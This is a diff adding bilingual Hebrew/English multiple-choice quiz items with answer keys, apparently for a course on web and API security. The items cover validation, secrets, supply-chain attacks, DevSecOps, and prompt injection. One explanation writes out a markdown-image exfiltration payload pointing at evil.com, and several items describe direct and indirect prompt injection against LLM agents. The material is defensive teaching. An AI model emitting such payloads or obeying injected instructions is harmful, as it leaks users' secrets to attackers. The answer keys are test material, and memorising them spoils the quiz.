+        "localStorage is accessible to all JavaScript on the page — an XSS attack can steal the token",
+        "localStorage is limited to 5MB and JWT is too large",
+        "localStorage is deleted when closing the browser",
+        "localStorage doesn't work in mobile browsers"
+      ]
+    },
+    {
+      q: "\u200Fמהי גישת Allowlist ב-input validation ולמה היא עדיפה?",
+      correct: "\u200Fמגדירים מה מותר (רק ערכים ספציפיים) — כל דבר אחר נחסם אוטומטית, גם מתקפות לא ידועות",
+      choices: [
+        "\u200Fמגדירים מה מותר (רק ערכים ספציפיים) — כל דבר אחר נחסם אוטומטית, גם מתקפות לא ידועות",
+        "\u200Fמגדירים רשימת IP מותרים לגישה ל-API",
+        "\u200Fמגדירים אילו שדות להחזיר בתשובת API",
+        "\u200Fמגדירים אילו HTTP methods מותרים"
+      ],
+      explanation: "\u200FDenylist (חסימת קלט רע) ניתן לעקוף עם encoding, case variations, unicode. Allowlist מגדיר בדיוק מה מותר: role: Joi.string().valid('user','editor'). כל דבר אחר = שגיאה.",
+      explanationEn: "Denylist (blocking bad input) can be bypassed with encoding, case variations, unicode. Allowlist defines exactly what's allowed: role: Joi.string().valid('user','editor'). Anything else = error.",
+      qEn: "What is the Allowlist approach in input validation and why is it preferred?",
+      correctEn: "Define what is allowed (only specific values) — everything else is automatically blocked, including unknown attacks",
+      choicesEn: [
+        "Define what is allowed (only specific values) — everything else is automatically blocked, including unknown attacks",
+        "Define a list of allowed IPs for API access",
+        "Define which fields to return in API responses",
+        "Define which HTTP methods are allowed"
+      ]
+    },
+    {
+      q: "\u200Fלמה client-side validation לא מספיקה לאבטחת API?",
+      correct: "\u200Fתוקף יכול לשלוח בקשות ישירות ל-API (curl/Postman) ולעקוף כל validation בצד הלקוח",
+      choices: [
+        "\u200Fתוקף יכול לשלוח בקשות ישירות ל-API (curl/Postman) ולעקוף כל validation בצד הלקוח",
+        "\u200Fכי JavaScript לא תומך ב-regex מורכב",
+        "\u200Fכי הדפדפן לא שומר validation בין דפים",
+        "\u200Fכי client-side validation איטית מדי"
+      ],
+      explanation: "\u200Fכל validation בצד הלקוח הוא UX בלבד — תוקף עוקף אותו בקלות עם curl, Burp Suite, או DevTools. Server-side validation חובה בכל endpoint. Client validation = חוויית משתמש, Server validation = אבטחה.",
+      explanationEn: "All client-side validation is UX only — an attacker bypasses it easily with curl, Burp Suite, or DevTools. Server-side validation is mandatory on every endpoint. Client = UX, Server = security.",
+      qEn: "Why is client-side validation insufficient for API security?",
+      correctEn: "An attacker can send requests directly to the API (curl/Postman) bypassing all client-side validation",
+      choicesEn: [
+        "An attacker can send requests directly to the API (curl/Postman) bypassing all client-side validation",
+        "Because JavaScript doesn't support complex regex",
+        "Because the browser doesn't persist validation between pages",
+        "Because client-side validation is too slow"
+      ]
+    }
+  ],
+  706: [
+    {
+      q: "\u200Fלמה גישת Allowlist עדיפה על Denylist ב-input validation?",
+      correct: "\u200FDenylist ניתן לעקיפה עם encoding ו-unicode. Allowlist חוסם הכל מלבד מה שהוגדר כמותר",
+      choices: [
+        "\u200FDenylist ניתן לעקיפה עם encoding ו-unicode. Allowlist חוסם הכל מלבד מה שהוגדר כמותר",
+        "\u200FAllowlist מהיר יותר בביצועים",
+        "\u200FDenylist דורש יותר זיכרון",
+        "\u200Fאין הבדל — שניהם מספקים אותה רמת אבטחה"
+      ],
+      explanation: "\u200FDenylist מנסה לחסום מתקפות ידועות, אבל תוקפים מוצאים דרכים חדשות (case changes, double encoding, unicode). Allowlist מגדיר בדיוק מה מותר ודוחה הכל אחר — מגן גם מפני מתקפות שעדיין לא ידועות.",
+      explanationEn: "Denylist tries to block known attacks, but attackers find new ways (case changes, double encoding, unicode). Allowlist defines exactly what's allowed and rejects everything else — protects against unknown attacks too.",
+      qEn: "Why is the Allowlist approach preferred over Denylist in input validation?",
+      correctEn: "Denylist can be bypassed with encoding and unicode. Allowlist blocks everything except what's defined as allowed",
+      choicesEn: [
+        "Denylist can be bypassed with encoding and unicode. Allowlist blocks everything except what's defined as allowed",
+        "Allowlist is faster in performance",
+        "Denylist requires more memory",
+        "No difference — both provide the same level of security"
+      ]
+    },
+    {
+      q: "\u200Fלמה אסור לשלוח stack trace ללקוח בהודעת שגיאה?",
+      correct: "\u200Fstack trace חושף מידע פנימי: נתיבי קבצים, שמות טבלאות, ספריות — מידע שעוזר לתוקף",
+      choices: [
+        "\u200Fstack trace חושף מידע פנימי: נתיבי קבצים, שמות טבלאות, ספריות — מידע שעוזר לתוקף",
+        "\u200Fstack trace גדול מדי ומאט את הרשת",
+        "\u200Fstack trace לא קריא למשתמשים רגילים",
+        "\u200Fstack trace גורם לדפדפן לקרוס"
+      ],
+      explanation: "\u200Fstack trace חושף פרטים כמו: באיזו שפה ו-framework כתוב השרת, מבנה ספריות, שמות DB וטבלאות, גרסאות ספריות. הפתרון: הודעה גנרית + errorId ללקוח, וlog מפורט פנימי.",
+      explanationEn: "Stack trace reveals details like: server language and framework, directory structure, DB and table names, library versions. Solution: generic message + errorId to client, detailed internal logging.",
+      qEn: "Why should you never send a stack trace to the client in an error message?",
+      correctEn: "Stack trace exposes internal info: file paths, table names, libraries — information that helps attackers",
+      choicesEn: [
+        "Stack trace exposes internal info: file paths, table names, libraries — information that helps attackers",
+        "Stack trace is too large and slows the network",
+        "Stack trace is not readable for regular users",
+        "Stack trace causes the browser to crash"
+      ]
+    },
+    {
+      q: "\u200Fמה הדרך הנכונה לנהל secrets (API keys, סיסמאות DB)?",
+      correct: "\u200Fenvironment variables או vault — לעולם לא בקוד מקור או ב-git",
+      choices: [
+        "\u200Fenvironment variables או vault — לעולם לא בקוד מקור או ב-git",
+        "\u200Fלשמור בקובץ config.js מוצפן בתוך הפרויקט",
+        "\u200Fלשמור בתגובה (comment) בקוד כדי שלא ירוץ",
+        "\u200Fלשמור ב-README.md עם הערה 'סודי'"
+      ],
+      explanation: "\u200Fsecrets ב-git history נשארים לנצח גם אחרי מחיקה. הפתרון: .env קבצים (ב-.gitignore), או פתרונות כמו HashiCorp Vault, AWS Secrets Manager. Secret rotation תקופתי חיוני.",
+      explanationEn: "Secrets in git history remain forever even after deletion. Solution: .env files (in .gitignore), or tools like HashiCorp Vault, AWS Secrets Manager. Periodic secret rotation is essential.",
+      qEn: "What is the correct way to manage secrets (API keys, DB passwords)?",
+      correctEn: "Environment variables or vault — never in source code or git",
+      choicesEn: [
+        "Environment variables or vault — never in source code or git",
+        "Store in an encrypted config.js file inside the project",
+        "Store in a code comment so it doesn't run",
+        "Store in README.md with a 'secret' note"
+      ]
+    },
+    {
+      q: "\u200Fמהי מתקפת Dependency Confusion?",
+      correct: "\u200Fתוקף יוצר חבילה ציבורית ב-npm עם אותו שם של חבילה פנימית בארגון, וגרסה גבוהה יותר",
+      choices: [
+        "\u200Fתוקף יוצר חבילה ציבורית ב-npm עם אותו שם של חבילה פנימית בארגון, וגרסה גבוהה יותר",
+        "\u200Fתוקף מתקין חבילות עם שגיאות כתיב (typosquatting)",
+        "\u200Fתוקף מוחק חבילות ממאגר npm ציבורי",
+        "\u200Fתוקף משנה את תיעוד החבילה כדי להטעות מפתחים"
+      ],
+      explanation: "\u200Fכשארגון משתמש ב-private registry, npm עלול להעדיף את הגרסה הציבורית הגבוהה יותר ולהתקין את החבילה הזדונית. הגנה: scoped packages (@company/pkg), .npmrc עם registry ספציפי.",
+      explanationEn: "When an org uses a private registry, npm may prefer the higher public version and install the malicious package. Defense: scoped packages (@company/pkg), .npmrc with specific registry.",
+      qEn: "What is a Dependency Confusion attack?",
+      correctEn: "Attacker creates a public npm package with the same name as an org's internal package, with a higher version",
+      choicesEn: [
+        "Attacker creates a public npm package with the same name as an org's internal package, with a higher version",
+        "Attacker installs packages with typos (typosquatting)",
+        "Attacker deletes packages from public npm registry",
+        "Attacker modifies package documentation to mislead developers"
+      ]
+    },
+    {
+      q: "\u200Fמה ההבדל בין npm install לבין npm ci ולמה זה חשוב לאבטחה?",
+      correct: "\u200Fnpm ci מתקין בדיוק מה שב-lockfile ולא משנה אותו — מבטיח reproducible builds",
+      choices: [
+        "\u200Fnpm ci מתקין בדיוק מה שב-lockfile ולא משנה אותו — מבטיח reproducible builds",
+        "\u200Fnpm ci מתקין רק devDependencies",
+        "\u200Fnpm install מהיר יותר ולכן עדיף לפרודקשן",
+        "\u200Fאין הבדל אבטחתי — שניהם מתקינים אותו דבר"
+      ],
+      explanation: "\u200Fnpm install יכול לעדכן package-lock.json ולהתקין גרסאות שונות. npm ci מתקין בדיוק לפי lockfile, מוחק node_modules ישן, ולא משנה את הlock. ב-CI/CD חובה npm ci למניעת שינויים לא צפויים.",
+      explanationEn: "npm install can update package-lock.json and install different versions. npm ci installs exactly from lockfile, deletes old node_modules, and doesn't modify the lock. In CI/CD, npm ci is mandatory to prevent unexpected changes.",
+      qEn: "What is the difference between npm install and npm ci, and why does it matter for security?",
+      correctEn: "npm ci installs exactly what's in the lockfile without modifying it — ensures reproducible builds",
+      choicesEn: [
+        "npm ci installs exactly what's in the lockfile without modifying it — ensures reproducible builds",
+        "npm ci only installs devDependencies",
+        "npm install is faster so it's preferred for production",
+        "No security difference — both install the same thing"
+      ]
+    }
+  ],
+  707: [
+    {
+      q: "\u200Fמהי Prompt Injection ולמה היא דומה ל-SQL Injection?",
+      correct: "\u200Fהזרקת הוראות זדוניות ל-prompt של LLM — כמו SQLi, קלט משתמש מעורב עם הוראות מערכת",
+      choices: [
+        "\u200Fהזרקת הוראות זדוניות ל-prompt של LLM — כמו SQLi, קלט משתמש מעורב עם הוראות מערכת",
+        "\u200Fמתקפה שמזריקה וירוסים לתוך מודל AI",
+        "\u200Fפריצה לשרתים של OpenAI דרך ה-API",
+        "\u200Fשימוש ב-AI ליצירת קוד זדוני"
+      ],
+      explanation: "\u200Fכמו ב-SQLi שבו קלט משתמש מתערבב עם פקודות SQL, ב-Prompt Injection קלט משתמש מתערבב עם הוראות המערכת של ה-LLM. ההבדל: ב-SQL יש פתרון (parameterized queries), ב-LLM אין פתרון מושלם.",
+      explanationEn: "Like SQLi where user input mixes with SQL commands, in Prompt Injection user input mixes with the LLM's system instructions. The difference: SQL has a solution (parameterized queries), LLMs have no perfect solution.",
+      qEn: "What is Prompt Injection and why is it similar to SQL Injection?",
+      correctEn: "Injecting malicious instructions into an LLM's prompt — like SQLi, user input mixed with system instructions",
+      choicesEn: [
+        "Injecting malicious instructions into an LLM's prompt — like SQLi, user input mixed with system instructions",
+        "An attack that injects viruses into an AI model",
+        "Hacking OpenAI servers through the API",
+        "Using AI to create malicious code"
+      ]
+    },
+    {
+      q: "\u200Fמה ההבדל בין Direct ל-Indirect Prompt Injection?",
+      correct: "\u200FDirect — קלט ישיר מהמשתמש. Indirect — קוד זדוני מוסתר בתוכן חיצוני שה-LLM קורא",
+      choices: [
+        "\u200FDirect — קלט ישיר מהמשתמש. Indirect — קוד זדוני מוסתר בתוכן חיצוני שה-LLM קורא",
+        "\u200FDirect — מתקפה מהירה. Indirect — מתקפה איטית",
+        "\u200FDirect — על מודלים קטנים. Indirect — על מודלים גדולים",
+        "\u200FDirect — דרך API. Indirect — דרך ממשק ווב"
+      ],
+      explanation: "\u200FIndirect מסוכן יותר: הקוד הזדוני מוסתר בדפי ווב, מיילים, או מסמכים כטקסט לבן על רקע לבן. המשתמש לא רואה את המתקפה, וה-LLM מעבד את ההוראות כחלק מהתוכן.",
+      explanationEn: "Indirect is more dangerous: malicious code is hidden in web pages, emails, or documents as white text on white background. The user doesn't see the attack, and the LLM processes the instructions as part of the content.",
+      qEn: "What is the difference between Direct and Indirect Prompt Injection?",
+      correctEn: "Direct — direct user input. Indirect — malicious code hidden in external content the LLM reads",
+      choicesEn: [
+        "Direct — direct user input. Indirect — malicious code hidden in external content the LLM reads",
+        "Direct — fast attack. Indirect — slow attack",
+        "Direct — on small models. Indirect — on large models",
+        "Direct — via API. Indirect — via web interface"
+      ]
+    },
+    {
+      q: "\u200Fלמה אי אפשר לפתור Prompt Injection לחלוטין כמו SQL Injection?",
+      correct: "\u200Fב-SQL יש הפרדה ברורה בין קוד לנתונים. ב-LLM, הוראות ונתונים הם באותו מדיום — טקסט טבעי",
+      choices: [
+        "\u200Fב-SQL יש הפרדה ברורה בין קוד לנתונים. ב-LLM, הוראות ונתונים הם באותו מדיום — טקסט טבעי",
+        "\u200Fכי LLMs חדשים מדי ועוד לא פיתחו פתרון",
+        "\u200Fכי יש יותר מדי שפות שה-LLM תומך בהן",
+        "\u200Fכי ה-GPU לא מספיק חזק לבדוק הזרקות"
+      ],
+      explanation: "\u200FParameterized queries מפרידים קוד מנתונים ברמה מבנית. ב-LLM, system prompt וuser input הם שניהם טקסט. המודל לא יכול להבחין באופן מהימן בין 'הוראת מערכת' ל'טקסט שמתחזה להוראה'. זו בעיה ארכיטקטורית יסודית.",
+      explanationEn: "Parameterized queries separate code from data at a structural level. In LLMs, system prompt and user input are both text. The model can't reliably distinguish between 'system instruction' and 'text pretending to be an instruction'. This is a fundamental architectural problem.",
+      qEn: "Why can't Prompt Injection be fully solved like SQL Injection?",
+      correctEn: "In SQL there's clear separation between code and data. In LLMs, instructions and data are in the same medium — natural text",
+      choicesEn: [
+        "In SQL there's clear separation between code and data. In LLMs, instructions and data are in the same medium — natural text",
+        "Because LLMs are too new and haven't developed a solution yet",
+        "Because there are too many languages the LLM supports",
+        "Because the GPU isn't powerful enough to check injections"
+      ]
+    },
+    {
+      q: "\u200Fמהו Excessive Agency (LLM08) ולמה הוא מסוכן?",
+      correct: "\u200Fמתן כלים והרשאות רבים מדי ל-LLM — אם יש prompt injection, הנזק הפוטנציאלי עצום",
+      choices: [
+        "\u200Fמתן כלים והרשאות רבים מדי ל-LLM — אם יש prompt injection, הנזק הפוטנציאלי עצום",
+        "\u200Fשימוש ב-LLM בלי הסכמת המשתמש",
+        "\u200Fכשה-LLM מסרב לענות על שאלות לגיטימיות",
+        "\u200Fכשה-LLM מייצר תוכן לא מדויק"
+      ],
+      explanation: "\u200FAI agent עם גישה ל-DB, מייל, מערכת קבצים — אם תוקף מצליח ב-prompt injection, הוא יכול למחוק נתונים, לשלוח מיילים, לגשת לקבצים. הפתרון: least privilege — רק הכלים הנחוצים + human-in-the-loop לפעולות קריטיות.",
+      explanationEn: "An AI agent with access to DB, email, filesystem — if an attacker succeeds in prompt injection, they can delete data, send emails, access files. Solution: least privilege — only necessary tools + human-in-the-loop for critical actions.",
+      qEn: "What is Excessive Agency (LLM08) and why is it dangerous?",
+      correctEn: "Giving too many tools and permissions to the LLM — if prompt injection succeeds, the potential damage is enormous",
+      choicesEn: [
+        "Giving too many tools and permissions to the LLM — if prompt injection succeeds, the potential damage is enormous",
+        "Using an LLM without user consent",
+        "When the LLM refuses to answer legitimate questions",
+        "When the LLM generates inaccurate content"
+      ]
+    },
+    {
+      q: "\u200Fאיך data exfiltration דרך markdown images עובד?",
+      correct: "\u200Fה-LLM מייצר תגית תמונה עם URL שמכיל מידע רגיש — הדפדפן שולח GET request עם הנתונים לשרת התוקף",
+      choices: [
+        "\u200Fה-LLM מייצר תגית תמונה עם URL שמכיל מידע רגיש — הדפדפן שולח GET request עם הנתונים לשרת התוקף",
+        "\u200Fהתוקף מעלה תמונה עם וירוס לשרת",
+        "\u200Fה-LLM שומר סיסמאות בתוך קבצי תמונה",
+        "\u200Fהדפדפן מוריד תמונה שמכילה keylogger"
+      ],
+      explanation: "\u200Fהתוקף גורם ל-LLM לכתוב: ![img](https://evil.com/steal?data=SECRET). כשהדפדפן מרנדר את ה-markdown, הוא שולח GET ל-evil.com עם ה-data כ-query parameter. הגנה: לא לרנדר תמונות מפלט LLM, או allowlist של דומיינים.",
+      explanationEn: "The attacker causes the LLM to write: ![img](https://evil.com/steal?data=SECRET). When the browser renders the markdown, it sends a GET to evil.com with the data as a query parameter. Defense: don't render images from LLM output, or domain allowlist.",
+      qEn: "How does data exfiltration through markdown images work?",
+      correctEn: "The LLM generates an image tag with a URL containing sensitive data — the browser sends a GET request with the data to the attacker's server",
+      choicesEn: [
+        "The LLM generates an image tag with a URL containing sensitive data — the browser sends a GET request with the data to the attacker's server",
+        "The attacker uploads an image with a virus to the server",
+        "The LLM saves passwords inside image files",
+        "The browser downloads an image containing a keylogger"
+      ]
+    }
+  ],
+  708: [
+    {
+      q: "\u200Fמהו Shift Left Security?",
+      correct: "\u200Fהזזת בדיקות אבטחה שמאלה בתהליך הפיתוח — מפרודקשן לכיוון כתיבת הקוד, כי תיקון מוקדם זול יותר",
+      choices: [
+        "\u200Fהזזת בדיקות אבטחה שמאלה בתהליך הפיתוח — מפרודקשן לכיוון כתיבת הקוד, כי תיקון מוקדם זול יותר",
+        "\u200Fשימוש ביד שמאל במקום ימין בעת כתיבת קוד",
+        "\u200Fהעברת אחריות האבטחה מהמפתחים ל-DevOps",
+        "\u200Fביצוע בדיקות אבטחה רק בסוף הפרויקט"
+      ],
+      explanation: "\u200Fתיקון באג אבטחה בזמן כתיבת קוד עולה x1, ב-PR עולה x5, ב-staging x10, בפרודקשן x100, אחרי פריצה x1000. Shift Left = אוטומציה של בדיקות אבטחה ב-CI/CD כדי למצוא בעיות מוקדם.",
+      explanationEn: "Fixing a security bug during coding costs x1, in PR x5, in staging x10, in production x100, after a breach x1000. Shift Left = automating security checks in CI/CD to find issues early.",
+      qEn: "What is Shift Left Security?",
+      correctEn: "Moving security testing left in the development process — from production toward code writing, because early fixes are cheaper",
+      choicesEn: [
+        "Moving security testing left in the development process — from production toward code writing, because early fixes are cheaper",
+        "Using the left hand instead of right when writing code",
+        "Transferring security responsibility from developers to DevOps",
+        "Performing security tests only at the end of the project"
+      ]
+    },
+    {
+      q: "\u200Fמה ההבדל בין SAST ל-DAST?",
+      correct: "\u200FSAST סורק קוד מקור ללא הרצה. DAST בודק אפליקציה רצה על ידי שליחת בקשות זדוניות",
+      choices: [
+        "\u200FSAST סורק קוד מקור ללא הרצה. DAST בודק אפליקציה רצה על ידי שליחת בקשות זדוניות",
+        "\u200FSAST לשפות סטטיות, DAST לשפות דינמיות",
+        "\u200FSAST רץ בפרודקשן, DAST רץ בפיתוח",
+        "\u200FSAST הוא כלי חינמי, DAST הוא כלי בתשלום"
+      ],
+      explanation: "\u200FSAST (Static) מנתח קוד מקור ומוצא דפוסים פגיעים כמו injection ו-hardcoded secrets. DAST (Dynamic) שולח בקשות זדוניות לאפליקציה רצה ומוצא misconfiguration ובעיות runtime. שניהם משלימים זה את זה.",
+      explanationEn: "SAST (Static) analyzes source code and finds vulnerable patterns like injection and hardcoded secrets. DAST (Dynamic) sends malicious requests to a running application and finds misconfiguration and runtime issues. Both complement each other.",
+      qEn: "What is the difference between SAST and DAST?",
+      correctEn: "SAST scans source code without running it. DAST tests a running application by sending malicious requests",
+      choicesEn: [
+        "SAST scans source code without running it. DAST tests a running application by sending malicious requests",
+        "SAST for static languages, DAST for dynamic languages",
+        "SAST runs in production, DAST runs in development",
+        "SAST is free, DAST is paid"
+      ]
+    },
+    {
+      q: "\u200Fלמה חשוב לסרוק את כל ה-git history ולא רק את הקומיט האחרון?",
+      correct: "\u200Fסודות שנמחקו בקומיט מאוחר עדיין קיימים בהיסטוריית git — תוקף יכול למצוא אותם",
+      choices: [
+        "\u200Fסודות שנמחקו בקומיט מאוחר עדיין קיימים בהיסטוריית git — תוקף יכול למצוא אותם",
+        "\u200Fכי git שומר רק את הקומיט האחרון בגיבוי",
+        "\u200Fכי באגים ישנים עלולים לחזור בגרסאות חדשות",
+        "\u200Fכי זה דרישה של GitHub לצורך אבטחת חשבון"
+      ],
+      explanation: "\u200Fגם אם מחקת API key בקומיט הבא, הוא עדיין נמצא בהיסטוריה. כלים כמו gitleaks ו-truffleHog סורקים את כל ההיסטוריה. אם נמצא secret — חובה לעשות rotation, לא מספיק למחוק.",
+      explanationEn: "Even if you deleted an API key in the next commit, it still exists in history. Tools like gitleaks and truffleHog scan all history. If a secret is found — rotation is mandatory, deletion is not enough.",
+      qEn: "Why is it important to scan the entire git history, not just the latest commit?",
+      correctEn: "Secrets deleted in a later commit still exist in git history — an attacker can find them",
+      choicesEn: [
+        "Secrets deleted in a later commit still exist in git history — an attacker can find them",
+        "Because git only backs up the latest commit",
+        "Because old bugs might return in new versions",
+        "Because it's a GitHub requirement for account security"
+      ]
+    },
+    {
+      q: "\u200Fמהי SCA (Software Composition Analysis)?",
+      correct: "\u200Fסריקת dependencies (ספריות צד שלישי) לפגיעויות ידועות מול מסדי CVE",
+      choices: [
+        "\u200Fסריקת dependencies (ספריות צד שלישי) לפגיעויות ידועות מול מסדי CVE",
+        "\u200Fניתוח ביצועים של קוד מקור",
+        "\u200Fסריקת קוד לבדיקת עמידה בסטנדרטים",
+        "\u200Fבדיקת תאימות בין גרסאות של Node.js"
+      ],
+      explanation: "\u200Fאפליקציית Node.js ממוצעת משתמשת במאות חבילות. כלים כמו npm audit, Snyk, ו-Dependabot בודקים כל חבילה מול מסדי CVE ומתריעים על פגיעויות ידועות. דוגמה מפורסמת: Log4Shell ב-Log4j.",
+      explanationEn: "An average Node.js app uses hundreds of packages. Tools like npm audit, Snyk, and Dependabot check each package against CVE databases and alert on known vulnerabilities. Famous example: Log4Shell in Log4j.",
+      qEn: "What is SCA (Software Composition Analysis)?",
+      correctEn: "Scanning dependencies (third-party libraries) for known vulnerabilities against CVE databases",
+      choicesEn: [
+        "Scanning dependencies (third-party libraries) for known vulnerabilities against CVE databases",
+        "Analyzing source code performance",
+        "Scanning code for standards compliance",
+        "Checking compatibility between Node.js versions"
+      ]
+    },
+    {
+      q: "\u200Fלמה Dockerfile צריך לרוץ כ-non-root user?",
+      correct: "\u200Fאם תוקף מנצל פגיעות, הוא מקבל הרשאות המשתמש — root = שליטה מלאה, non-root = נזק מוגבל",
+      choices: [
+        "\u200Fאם תוקף מנצל פגיעות, הוא מקבל הרשאות המשתמש — root = שליטה מלאה, non-root = נזק מוגבל",
+        "\u200Fכי root user צורך יותר זיכרון",
+        "\u200Fכי Docker לא תומך ב-root user בגרסאות חדשות",
+        "\u200Fכי non-root user מהיר יותר בהרצת containers"
+      ],
+      explanation: "\u200Froot ב-container יכול להיות root על ה-host במקרי container escape. Principle of least privilege — אפליקציה לא צריכה הרשאות root. בנוסף, multi-stage builds מקטינים את attack surface.",
+      explanationEn: "Root in container can be root on host in container escape scenarios. Principle of least privilege — an application doesn't need root permissions. Additionally, multi-stage builds reduce the attack surface.",
+      qEn: "Why should a Dockerfile run as a non-root user?",
+      correctEn: "If an attacker exploits a vulnerability, they get the user's permissions — root = full control, non-root = limited damage",
+      choicesEn: [
+        "If an attacker exploits a vulnerability, they get the user's permissions — root = full control, non-root = limited damage",
+        "Because root user consumes more memory",
+        "Because Docker doesn't support root user in new versions",
+        "Because non-root user is faster at running containers"
+      ]
+    }
   ]
 }
 
